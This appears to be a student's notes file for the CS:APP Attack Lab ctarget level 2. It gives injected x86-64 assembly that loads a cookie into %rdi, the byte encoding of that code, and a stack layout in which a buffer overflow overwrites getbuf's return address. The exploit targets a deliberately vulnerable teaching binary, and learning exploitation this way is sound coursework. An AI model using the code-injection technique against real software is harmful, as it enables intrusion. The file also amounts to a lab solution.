# code to be injected into ctarget level 2
    movq    $0x59B997FA, %rdi           # move cookie to %rdi
    addq    $12, %rsp                   # move stack pointer
    ret


# Byte representation of above assembly code:
# - assemble above code: gcc -c ctarget.l2.code.s  => creates ctarget.l2.code.o
# - disassemble it: objdump -d ctarget.l2.code.o

ctarget.l2.code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	48 83 c4 0C          	add    $0xC,%rsp
   b:	c3                   	retq   




# Stack structure:
# [larger addr]
#    address of touch2
#    movq
#    addq
#    ret
#    address of movq                    => this overwrites original return address
#    40 bytes for the getbuf stack frame
# [top of stack - smaller addr]

# Note that instructions on the stack get executed "upward", i.e. with increasing address.
